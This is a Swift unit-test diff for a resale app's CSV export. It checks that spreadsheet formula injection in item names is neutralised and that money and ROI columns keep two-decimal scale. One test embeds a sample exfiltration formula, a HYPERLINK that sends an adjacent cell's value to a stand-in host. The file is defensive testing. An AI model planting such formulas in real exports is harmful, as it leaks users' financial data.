@@ -3429,3 +3429,139 @@ final class AnalyticsOptOutTests: XCTestCase {
         XCTAssertTrue(Analytics.shared.isEnabled)
     }
 }
+
+// ── The one file a user forwards to their accountant ─────────────────────────
+//
+// Two separate defects in the same seven columns. The Item column is free text
+// from the model and the user, and a cell whose first character is `=`, `+`,
+// `-` or `@` is evaluated on open by Excel, Numbers and LibreOffice — RFC-4180
+// quoting does not stop it, because the quotes are stripped during import. And
+// the money columns split on overload resolution: three were `Double` and ran
+// through `%.2f`, while profit was `Decimal` and printed its natural scale, so
+// the one figure an accountant reconciles was the only one with no guaranteed
+// cent scale.
+
+final class FlipsCSVExportTests: XCTestCase {
+
+    private func sold(_ name: String, paid: Double, price: Double,
+                      fees: Double? = nil, on day: Int = 14) -> ScanResult {
+        let cal = Calendar.current
+        return ScanResult(
+            timestamp: cal.date(from: DateComponents(year: 2026, month: 9, day: day))!,
+            itemName: name, brand: "B", category: "clothing",
+            conditionNotes: "Good", valueLow: 40, valueHigh: 60,
+            confidence: "High", soldListingsCount: 0,
+            listingTitle: "T", listingDescription: "D",
+            paidPrice: paid, statusRaw: "sold", soldPrice: price,
+            soldDate: cal.date(from: DateComponents(year: 2026, month: 9, day: day))!,
+            feesEstimate: fees)
+    }
+
+    @MainActor
+    private func row(_ item: ScanResult) -> [String] {
+        let lines = FlipsViewModel().csv([item]).components(separatedBy: "\r\n")
+        XCTAssertEqual(lines.first, "Date,Item,Paid,Sold,Fees,Profit,ROI")
+        return (lines.count > 1 ? lines[1] : "").components(separatedBy: ",")
+    }
+
+    // ── Formula injection ────────────────────────────────────────────────
+
+    @MainActor
+    func test_aNameThatWouldExecuteIsNeutered() {
+        // The attack in the finding: the formula reads the cell beside it and
+        // sends what it finds somewhere else.
+        let hostile = "=HYPERLINK(\"http://x/?\"&C2,\"click\")"
+        let out = FlipsViewModel.csvText(hostile)
+        XCTAssertTrue(out.hasPrefix("\"'="), "must not start the cell with '='")
+        XCTAssertTrue(out.hasSuffix("\""), "and must be quoted, since it contains commas")
+    }
+
+    @MainActor
+    func test_everyLeadingCharacterASpreadsheetActsOnIsCovered() {
+        for lead in ["=", "+", "-", "@", "\t", "\r"] {
+            let out = FlipsViewModel.csvText(lead + "SUM(A1:A9)")
+            XCTAssertTrue(out.hasPrefix("\"'"), "\(lead.debugDescription) was left live")
+        }
+    }
+
+    @MainActor
+    func test_anOrdinaryNameIsUntouched() {
+        // Neutering everything would put an apostrophe in front of every item
+        // in the file. Only a name that would execute is changed.
+        XCTAssertEqual(FlipsViewModel.csvText("Patagonia Better Sweater"),
+                       "Patagonia Better Sweater")
+        XCTAssertEqual(FlipsViewModel.csvText("Levi's 501"), "Levi's 501")
+        XCTAssertEqual(FlipsViewModel.csvText("Nike, Air Max"), "\"Nike, Air Max\"")
+    }
+
+    @MainActor
+    func test_theCharacterItSelfIsNotSwallowed() {
+        // Neutralising must not lose data: the name still reads back whole
+        // once the leading marker is taken off.
+        let out = FlipsViewModel.csvText("-- vintage --")
+        XCTAssertEqual(out, "\"'-- vintage --\"")
+    }
+
+    @MainActor
+    func test_aHostileNameCannotBreakOutOfItsColumn() {
+        // End to end, through the real exporter: seven fields, and the row
+        // still parses as one row.
+        let cols = row(sold("=1+1", paid: 8, price: 65))
+        XCTAssertEqual(cols[1], "\"'=1+1\"")
+        XCTAssertFalse(cols[1].hasPrefix("="))
+    }
+
+    // ── Scale ────────────────────────────────────────────────────────────
+
+    @MainActor
+    func test_profitCarriesItsCentsLikeEveryOtherMoneyColumn() {
+        // The finding's own example: 8.00 paid, 65.00 sold, 9.00 fees used to
+        // export a profit of "48" beside three two-decimal columns.
+        let cols = row(sold("Sweater", paid: 8, price: 65, fees: 9))
+        XCTAssertEqual(cols[2], "8.00")
+        XCTAssertEqual(cols[3], "65.00")
+        XCTAssertEqual(cols[4], "9.00")
+        XCTAssertEqual(cols[5], "48.00")
+    }
+
+    @MainActor
+    func test_everyMoneyColumnIsTwoDecimalsOnAwkwardInput() {
+        let cols = row(sold("Jacket", paid: 12.345, price: 65.675, fees: 9.005))
+        for index in 2...5 {
+            let parts = cols[index].components(separatedBy: ".")
+            XCTAssertEqual(parts.count, 2, "column \(index) has no decimal point")
+            XCTAssertEqual(parts[1].count, 2, "column \(index) is not at cent scale")
+        }
+    }
+
+    @MainActor
+    func test_aLossStaysANumber() {
+        // A negative profit leads with '-', which is also a formula character.
+        // Neutering it would make the loss a text cell and the column would
+        // stop summing — which is the reason only free text is neutered.
+        let cols = row(sold("Jacket", paid: 40, price: 25, fees: 5))
+        XCTAssertEqual(cols[5], "-20.00")
+        XCTAssertFalse(cols[5].hasPrefix("'"))
+        XCTAssertFalse(cols[5].hasPrefix("\""))
+    }
+
+    @MainActor
+    func test_roiCanBeRecomputedFromTheColumnsBesideIt() {
+        // 0.4249… exported as "42%", so profit ÷ paid did not give the number
+        // in the ROI cell. Two decimals closes it.
+        let cols = row(sold("Sweater", paid: 8, price: 65, fees: 9))
+        XCTAssertEqual(cols[6], "600.00%")
+
+        let awkward = row(sold("Tee", paid: 47, price: 67, fees: 0))
+        XCTAssertEqual(awkward[6], "42.55%")
+    }
+
+    @MainActor
+    func test_theFileIsStillSevenColumnsAndRFC4180Quoted() {
+        let cols = row(sold("Nike, Air Max", paid: 10, price: 30))
+        XCTAssertEqual(cols.count, 8, "the quoted comma splits naively into two")
+        let line = FlipsViewModel().csv([sold("Nike, Air Max", paid: 10, price: 30)])
+            .components(separatedBy: "\r\n")[1]
+        XCTAssertTrue(line.contains("\"Nike, Air Max\""))
+    }
+}
